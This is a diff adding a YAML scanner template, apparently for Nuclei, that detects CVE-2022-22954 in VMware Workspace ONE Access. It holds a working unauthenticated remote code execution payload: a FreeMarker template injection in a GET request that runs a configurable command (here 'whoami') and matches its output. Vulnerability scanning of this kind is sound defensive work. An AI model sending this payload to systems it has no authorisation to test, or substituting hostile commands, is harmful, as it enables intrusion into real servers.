@@ -1,0 +1,45 @@
+id: cve-2022-22954
+info:
+  name: VMware Workspace ONE Access Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    VMware Workspace ONE Access and Identity Manager have a remote command execution vulnerability (CVE-2022-22954) caused by server template injection. This can be exploited by unauthenticated attackers to achieve arbitrary code execution.
+  classification:
+    cve-id: CVE-2022-22954
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: rce,command-injection
+  reference:
+    - https://kb.vmware.com/s/article/88099
+
+variables:
+  cmd: "whoami"
+
+http:
+  - raw:
+      - |
+        GET /catalog-portal/ui/oauth/verify?deviceUdid=${%7B"freemarker.template.utility.Execute"?new()("{{cmd}}")%7D&code=122&status=adadad HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 400
+      - type: word
+        part: header
+        words:
+          - "EUC_XSRF_TOKEN"
+      - type: regex
+        part: body
+        regex:
+          - "(?s)device id: .+?, device type"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "device id: (.*?), device type"
+        group: 1
